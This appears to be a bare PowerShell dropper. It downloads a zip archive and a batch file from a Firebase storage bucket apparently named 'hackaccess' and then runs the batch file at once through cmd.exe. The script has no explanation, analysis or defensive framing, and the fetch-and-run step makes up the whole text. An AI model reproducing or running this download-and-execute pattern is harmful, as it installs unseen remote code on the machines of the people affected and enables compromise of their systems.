    $client = new-object System.Net.WebClient  
$client.DownloadFile( "https://firebasestorage.googleapis.com/v0/b/hackaccess-4d765.appspot.com/o/abc.zip?alt=media&token=baafa4ad-0276-466e-88d3-5757503cedf4", ".\zk.zip")  
 $client.DownloadFile( "https://firebasestorage.googleapis.com/v0/b/hackaccess-4d765.appspot.com/o/z.bat?alt=media&token=bc9f3920-3712-4345-82c6-f8d83e49167f",   ".\z.bat")  
 cmd.exe /c .\z.bat 
 